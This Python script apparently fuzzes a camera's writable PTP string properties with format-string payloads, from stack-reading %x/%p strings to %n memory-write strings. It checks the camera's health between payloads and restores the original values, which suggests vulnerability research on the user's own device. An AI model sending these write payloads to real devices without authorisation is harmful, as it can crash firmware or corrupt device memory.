#!/usr/bin/env python3
"""Format-string fuzz on writable PTP STRING properties.

If the firmware ever passes the property value to a printf-family
function as the format argument (very common firmware mistake), then
payloads like '%s%s%s%n' will either:
  - CRASH the PTP service (null pointer deref reading %s args)
  - Leak stack/heap data (visible in subsequent reads or logs)
  - Write into memory (%n) and corrupt state

We probe the safest payloads first (read-only %x/%p/%s), then escalate
to %n (memory-write) last. After EACH payload we check camera health
via a fresh GetDeviceInfo round-trip — if the camera goes silent or
returns garbage, we've found the bug.

Target properties (RW STRING, in priority order):
  - 0xD406: empty default, no enum, no format constraint — best target
  - 0x5011: DateTime (has implicit format constraint but might be lax)

The other RW STRING properties (0x5003, 0xD605) are enum-constrained
(camera rejects non-enum values), so format strings won't reach the
parser. Skipped.
"""
from __future__ import annotations
import os, sys, time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from larkfly import Camera
from larkfly.exceptions import PtpError, TransportError


# Payloads — first batch is read-only (safe), second batch escalates
SAFE_PAYLOADS = [
    '%s',                        # 1 deref
    '%x',                        # 1 stack read
    '%p',                        # 1 stack read as pointer
    '%s%s%s%s',                  # 4 derefs — most likely to crash
    '%x %x %x %x',               # 4 stack reads
    '%p %p %p %p %p %p',         # 6 stack reads
    'AAAA%x.%x.%x.%x',           # marker + 4 reads — if we see "AAAA" + leaked data in any subsequent read, we have format-string proof
    'BBBB%08x.%08x.%08x.%08x',   # marker + padded reads
    '%.100x',                    # large allocation
    '%99999x',                   # huge allocation — might OOM
    '%.4096s',                   # large string deref
    '%hhn',                      # smallest write primitive (rare to be vuln)
]

# Dangerous — actual memory writes
WRITE_PAYLOADS = [
    '%n',                        # 4-byte write to wherever
    '%hn',                       # 2-byte write
    'AAAA%n',                    # marker + write
    'AAAA%99999x%n',             # write a big-number to wherever
]


def camera_alive(host: str, bind: str) -> tuple[bool, str]:
    """Try a fresh PTP session round-trip. Returns (ok, diag)."""
    try:
        c = Camera(host, bind=bind)
        c.connect()
        info = c.device_info()
        nprops = len(info['device_properties_supported'])
        nops = len(info['operations_supported'])
        c.close()
        return True, f"{nprops} props / {nops} ops"
    except (TransportError, PtpError, Exception) as e:
        return False, f"{type(e).__name__}: {str(e)[:120]}"


def try_payload(cam: Camera, code: int, payload: str) -> dict:
    """Attempt to write payload to code; read it back; report behavior."""
    out = {'payload': payload}
    try:
        cam.set_prop_value(code, payload)
        out['set_rc'] = '0x2001 (OK)'
    except PtpError as e:
        out['set_rc'] = f'0x{e.response_code:04X}'
        return out
    except Exception as e:
        out['set_exc'] = type(e).__name__ + ': ' + str(e)[:80]
        return out

    # Read back via raw — see if the firmware formatted/transformed it
    try:
        rc, _, raw = cam._raw_op(0x1015, [code])
        out['read_rc'] = f'0x{rc:04X}'
        if rc == 0x2001 and raw:
            n = raw[0]
            try:
                s = raw[1:1+2*n].decode('utf-16-le', errors='replace').rstrip('\x00')
                out['read_back'] = repr(s)
                if s != payload:
                    out['transformed'] = '!!! READ-BACK DIFFERS FROM PAYLOAD'
            except Exception:
                out['read_back_hex'] = raw.hex()
    except Exception as e:
        out['read_exc'] = type(e).__name__ + ': ' + str(e)[:80]

    return out


def main():
    host = '192.168.1.1'
    bind = '192.168.1.10'

    # Baseline health
    ok, diag = camera_alive(host, bind)
    print(f"[*] Baseline health: {'OK' if ok else 'FAIL'} ({diag})\n")
    if not ok:
        print("Camera not alive — aborting.")
        return 1

    TARGETS = [0xD406, 0x5011]

    for code in TARGETS:
        print(f"=== Target 0x{code:04X} ===")
        cam = Camera(host, bind=bind)
        cam.connect()
        try:
            original = cam.get_prop_value(code)
            print(f"  original value: {original!r}")
        except Exception as e:
            print(f"  can't read original: {e}")
            cam.close()
            continue

        for payload in SAFE_PAYLOADS:
            result = try_payload(cam, code, payload)
            tag = '★' if result.get('transformed') else ' '
            print(f"  {tag} payload={result['payload']!r:35s}", end='')
            for k, v in result.items():
                if k == 'payload': continue
                print(f"  {k}={v}", end='')
            print()

        # Restore + health check before write payloads
        try:
            cam.set_prop_value(code, original)
            print(f"  restored original ({original!r})")
        except Exception as e:
            print(f"  ! restore failed: {e}")
        cam.close()

        time.sleep(0.5)
        ok, diag = camera_alive(host, bind)
        print(f"  Camera health after SAFE batch: {'OK' if ok else '!!! DOWN'} ({diag})\n")
        if not ok:
            print("[!] Stopping — camera went down after SAFE batch.")
            return 0

    # WRITE batch (more dangerous) — only on 0xD406 to limit damage
    print("=== %n WRITE batch on 0xD406 (one payload at a time, health-check between) ===")
    for payload in WRITE_PAYLOADS:
        cam = Camera(host, bind=bind)
        cam.connect()
        try:
            original = cam.get_prop_value(0xD406)
        except Exception as e:
            print(f"  pre-read failed: {e}")
            cam.close()
            break
        result = try_payload(cam, 0xD406, payload)
        print(f"   payload={result['payload']!r:30s}", end='')
        for k, v in result.items():
            if k == 'payload': continue
            print(f"  {k}={v}", end='')
        print()
        try:
            cam.set_prop_value(0xD406, original)
        except Exception:
            pass
        cam.close()

        time.sleep(1)
        ok, diag = camera_alive(host, bind)
        print(f"  health: {'OK' if ok else '!!! DOWN'} ({diag})")
        if not ok:
            print(f"  [!] Stopping — camera went down after payload {payload!r}")
            print(f"  Recovery: power-cycle the camera")
            return 0

    print("\n[*] All payloads completed. Camera survived. Either:")
    print("    (a) firmware doesn't pass STRING values to printf-family fns")
    print("    (b) values get sanitized before format-style operations")
    print("    (c) firmware uses something other than printf for logging")


if __name__ == '__main__':
    sys.exit(main())
